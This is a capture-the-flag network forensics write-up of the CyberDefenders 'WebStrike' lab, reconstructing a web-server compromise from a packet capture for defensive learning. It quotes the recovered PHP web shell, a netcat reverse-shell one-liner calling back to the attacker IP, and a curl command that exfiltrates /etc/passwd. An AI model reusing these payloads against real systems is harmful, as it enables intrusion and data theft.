# Case 08 — WebStrike

**Platform:** CyberDefenders  
**Category:** Network Forensics  
**Difficulty:** Easy 
**Evidence:** Network capture — `WebStrike.pcap`  
**Case Number:** 2026-008  

---

## Scenario

Suspicious activity was flagged on a company web server. A packet capture was taken during the incident and handed over for analysis — work out who attacked it, how they got in, and what they took.

---

## What I Found

This was my first purely network forensics lab — no disk image, no registry hives, just a PCAP. Everything came from following packets and reconstructing what the attacker did through the traffic alone.

The attacker came in from `117.11.88.124` — a Chinese IP out of Tianjin City. They hit the web server (`24.49.63.79`) with a basic GET request first, then found a file upload endpoint at `/reviews/upload.php` and went straight for it.

The upload was the clever part. They named the file `image.jpg.php` — the double extension trick. The server's validation looked at the filename and saw `.jpg`. The web server looked at it and executed it as `.php`. The file itself was a PHP one-liner that runs a netcat reverse shell:

```
<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 117.11.88.124 8080 >/tmp/f"); ?>
```

That shell used a named pipe (`/tmp/f`) to create a bidirectional connection — the compromised server called *out* to the attacker on port 8080, which means inbound firewall rules wouldn't have blocked it. Once the shell was live, the attacker ran one command:

```
curl -X POST -d /etc/passwd http://117.11.88.124:443/
```

They exfiltrated `/etc/passwd` over port 443 — using the HTTPS port to make the outbound traffic look like normal web traffic. The whole thing from first contact to data out the door took about three minutes.

---

## Artifacts Documented

| # | Artifact | Key Finding |
|---|----------|-------------|
| 1 | HTTP GET `/` | First contact from attacker — reconnaissance begins at 18:43:28 |
| 2 | HTTP POST `/reviews/upload.php` | Web shell uploaded as `image.jpg.php` — double extension bypass; PHP netcat reverse shell payload |
| 3 | HTTP GET `/reviews/uploads/image.jpg.php` | Server executed uploaded PHP file — remote code execution confirmed |
| 4 | TCP outbound to port 8080 | Victim server connected back to attacker — reverse shell established |
| 5 | TCP stream content | `curl -X POST -d /etc/passwd http://117.11.88.124:443/` — `/etc/passwd` exfiltrated |

---

## Network Context

| Field | Value |
|-------|-------|
| Attacker IP | 117.11.88.124 |
| Attacker Location | Tianjin City, China |
| Victim Server | 24.49.63.79 |
| Server OS | Linux (confirmed via /etc/passwd) |
| C2 Port | 8080 (reverse shell) |
| Exfil Port | 443 (curl POST) |
| Attack Vector | Insecure file upload — `/reviews/upload.php` |


---


## What I Learned

**PCAP analysis is a different mental model from disk forensics.** With a disk image you're searching a static snapshot. With a PCAP you're watching a conversation happen — following the sequence of who said what, when, and in which direction. The direction of connections matters a lot. The reverse shell only makes sense once you realise the *server* is calling *out* to the attacker, not the other way around.

**Follow TCP Stream is the most important button in Wireshark for this kind of work.** Individual packets show you headers and metadata. The stream shows you the actual content — the PHP code that was uploaded, the commands the attacker ran, the file that got exfiltrated. Right-click → Follow → TCP Stream was how I recovered the web shell payload and the curl command.

**Double extension bypasses are still common and still work.** The filter checked for `.jpg`. The execution engine saw `.php`. Two different systems looking at the same filename and reaching different conclusions. The fix is validating the *last* extension, or better, checking MIME type against a whitelist server-side regardless of what the filename says.

**Port 443 for exfiltration is deliberate.** Outbound HTTPS traffic is almost universally allowed and rarely inspected. Sending `/etc/passwd` as a plain HTTP POST *to* port 443 (not as actual HTTPS) exploits that assumption. Without TLS inspection at the network boundary, this blends in with normal traffic.

**The whole attack took about three minutes.** From first packet to data exfiltrated — 18:43 to 18:46. That's faster than most incident response processes even get started. It's a useful reminder that detection needs to happen at the network level in real time, not post-hoc from a PCAP.

---


[View Full Report](./WebStrike-Report.pdf)
